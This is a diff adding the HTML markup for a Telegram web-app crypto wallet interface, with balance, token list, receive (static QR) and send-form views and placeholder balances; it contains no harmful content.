@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Crypto Wallet</title>
+    <link rel="stylesheet" href="style.css" />
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+
+<body>
+    <div id="main-view" class="view">
+        <div class="balance-section">
+            <h1 id="balance">$3.00</h1>
+            <p class="balance-change">🔻 $2.00 (-2.0%)</p>
+        </div>
+
+        <div class="actions">
+            <div class="icon-wrapper" onclick="openCoinSelector('send')">
+                <button class="icon-circle">
+                    <svg width="24" height="24" viewBox="0 0 20 20">
+                        <path
+                            d="M10.002 2.499L15.895 8.392l-1.473 1.473L11.043 6.486V17.5H8.959V6.487L5.582 9.865 4.108 8.392 10.002 2.499Z"
+                            fill="white" />
+                    </svg>
+                </button>
+                <span class="icon-label">Send</span>
+            </div>
+
+            <div class="icon-wrapper" onclick="openCoinSelector('receive')">
+                <button class="icon-circle">
+                    <svg width="24" height="24" viewBox="0 0 20 20">
+                        <path
+                            d="M9.998 17.499 4.105 11.607l1.473-1.473 3.379 3.379V2.498h2.084v10.513l3.378-3.378 1.474 1.473-5.893 5.893Z"
+                            fill="white" />
+                    </svg>
+                </button>
+                <span class="icon-label">Receive</span>
+            </div>
+
+            <div class="icon-wrapper" onclick="handleAction('buy')">
+                <button class="icon-circle">
+                    <svg width="24" height="24" viewBox="0 0 24 24">
+                        <path d="M21 5H3v3h18V5ZM21 10.5H3v8.5h18V10.5ZM6 13h5v2.5H6V13Zm9.5 0H13v2.5h2.5V13Z"
+                            fill="white" />
+                    </svg>
+                </button>
+                <span class="icon-label">Buy</span>
+            </div>
+        </div>
+
+        <div class="tokens">
+            <div class="tabs">
+                <span class="active">Crypto</span>
+                <span>NFTs</span>
+            </div>
+
+            <div class="token token-click" onclick="openCryptoView('TRX')">
+                <img src="assets/tron.svg" />
+                <div class="token-info">
+                    <div class="name">TRX <span>Tron</span></div>
+                    <div class="price">$0.26 <span class="red">−2.40%</span></div>
+                </div>
+                <div class="amount">0.032</div>
+            </div>
+
+            <div class="token token-click" onclick="openCryptoView('USDT')">
+                <img src="assets/usdt.svg" />
+                <div class="token-info">
+                    <div class="name">USDT <span>Tron</span></div>
+                    <div class="price">$1.00 <span class="green">+0.02%</span></div>
+                </div>
+                <div class="amount">3.00</div>
+            </div>
+        </div>
+
+        <footer>Powered by Crypto Wallet · Wallet ID: TVx...abcZ</footer>
+    </div>
+
+    <!-- Crypto View -->
+    <div id="crypto-view" class="view hidden">
+        <div class="sheet-header">
+            <span class="title" id="crypto-title">TRX Wallet</span>
+            <button class="close-btn" onclick="closeCryptoView()">✕</button>
+        </div>
+
+        <div class="token-title" style="margin: 16px 0;">
+            <img id="crypto-icon" src="assets/trx.svg" />
+            <div>
+                <div class="token-name" id="crypto-name">TRX</div>
+                <div class="token-sub">Tron</div>
+            </div>
+        </div>
+
+        <div class="balance-section">
+            <h1 id="crypto-balance">0.032 TRX</h1>
+            <p class="balance-change">$1.00</p>
+        </div>
+
+        <div class="actions">
+            <div class="icon-wrapper" onclick="openSendForm(selectedCoin)">
+                <button class="icon-circle">
+                    <svg width="24" height="24" viewBox="0 0 20 20">
+                        <path
+                            d="M10.002 2.499L15.895 8.392l-1.473 1.473L11.043 6.486V17.5H8.959V6.487L5.582 9.865 4.108 8.392 10.002 2.499Z"
+                            fill="white" />
+                    </svg>
+                </button>
+                <span class="icon-label">Send</span>
+            </div>
+
+            <div class="icon-wrapper" onclick="openReceiveView(selectedCoin)">
+                <button class="icon-circle">
+                    <svg width="24" height="24" viewBox="0 0 20 20">
+                        <path
+                            d="M9.998 17.499 4.105 11.607l1.473-1.473 3.379 3.379V2.498h2.084v10.513l3.378-3.378 1.474 1.473-5.893 5.893Z"
+                            fill="white" />
+                    </svg>
+                </button>
+                <span class="icon-label">Receive</span>
+            </div>
+
+            <div class="icon-wrapper" onclick="handleAction('buy')">
+                <button class="icon-circle">
+                    <svg width="24" height="24" viewBox="0 0 24 24">
+                        <path d="M21 5H3v3h18V5ZM21 10.5H3v8.5h18V10.5ZM6 13h5v2.5H6V13Zm9.5 0H13v2.5h2.5V13Z"
+                            fill="white" />
+                    </svg>
+                </button>
+                <span class="icon-label">Buy</span>
+            </div>
+        </div>
+
+        <div class="transaction-history" id="tx-list">
+            <!-- Transactions rendered by script.js -->
+        </div>
+    </div>
+
+    <!-- Receive View -->
+    <div id="receive-view" class="view hidden">
+        <div class="sheet-header">
+            <span class="title" id="receive-title">Receive</span>
+            <button class="close-btn" onclick="closeReceiveView()">✕</button>
+        </div>
+        <div class="receive-content">
+            <div class="token-title">
+                <img id="receive-icon" src="assets/usdt.svg" />
+                <div>
+                    <div class="token-name" id="receive-name">USDT</div>
+                    <div class="token-sub">Tron</div>
+                </div>
+            </div>
+            <div class="qr-wrapper">
+                <img id="receive-qr" src="assets/qrusdt.jpg" class="qr-img" alt="QR" />
+            </div>
+            <div class="wallet-address" id="receive-address">TYq...zzLP</div>
+            <button class="primary-btn" onclick="copyAddress()">Copy</button>
+        </div>
+    </div>
+
+    <!-- Popup -->
+    <div id="popup-message" class="popup hidden">
+        <div class="popup-content">
+            <p id="popup-text">Message</p>
+            <button onclick="closePopup()" class="popup-btn">OK</button>
+        </div>
+    </div>
+    <!-- Send Form View -->
+    <div id="send-form-view" class="view hidden">
+        <div class="sheet-header">
+            <span class="title">SEND</span>
+            <button class="close-btn" onclick="closeSendForm()">✕</button>
+        </div>
+
+        <div class="form-field">
+            <label>Address or Domain</label>
+            <div class="input-wrapper">
+                <input type="text" id="send-address" placeholder="0x... or tron.domain" oninput="validateSendForm()" />
+                <button onclick="pasteAddress()">Paste</button>
+            </div>
+        </div>
+
+        <div class="form-field">
+            <label>Amount</label>
+            <div class="input-wrapper">
+                <input type="number" id="send-amount" placeholder="0.00" oninput="validateSendForm()" />
+                <span class="unit">USDT</span>
+                <button onclick="setMax()">Max</button>
+            </div>
+        </div>
+
+        <div class="form-field">
+            <label>Memo (Optional)</label>
+            <div class="input-wrapper">
+                <input type="text" id="send-memo" placeholder="Write memo..." />
+            </div>
+        </div>
+
+        <button id="send-next-btn" class="primary-btn" disabled onclick="submitSendForm()">Next</button>
+    </div>
+
+    <!-- Init and Script -->
+    <script>let selectedCoin = null;</script>
+    <script src="script.js"></script>
+</body>
+
+</html>
